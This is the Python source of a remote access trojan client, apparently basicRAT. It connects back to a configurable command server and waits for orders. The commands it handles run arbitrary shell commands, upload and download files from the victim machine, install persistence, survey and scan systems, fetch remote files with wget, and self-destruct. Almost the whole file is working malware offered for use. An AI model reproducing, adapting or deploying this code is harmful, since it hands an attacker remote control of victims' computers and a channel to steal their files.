#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import sys

from core import common, crypto, persistence, scan, survey, toolkit


# change these to suit your needs
HOST = 'localhost'
PORT = 1337


def main():
    # determine system platform
    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'
    
    # connect to basicRAT server
    conn = socket.socket()
    conn.connect((HOST, PORT))
    client = common.Client(conn, HOST, 1)

    while True:
        results = ''

        # wait to receive data from server
        data = client.recvGCM()

        # don't process empty data
        if not data:
            continue

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'download':
            client.sendfile(action.rstrip())
            continue

        elif cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()

        elif cmd == 'kill':
            conn.close()
            sys.exit(0)

        elif cmd == 'persistence':
            results = persistence.run(plat)

        # elif cmd == 'rekey':
        #    client.dh_key = crypto.diffiehellman(client.conn)
        #    continue

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(plat)

        elif cmd == 'survey':
            results = survey.run(plat)

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'upload':
            client.recvfile(action.rstrip())
            continue

        elif cmd == 'wget':
            results = toolkit.wget(action)

        client.sendGCM(results)


if __name__ == '__main__':
    main()
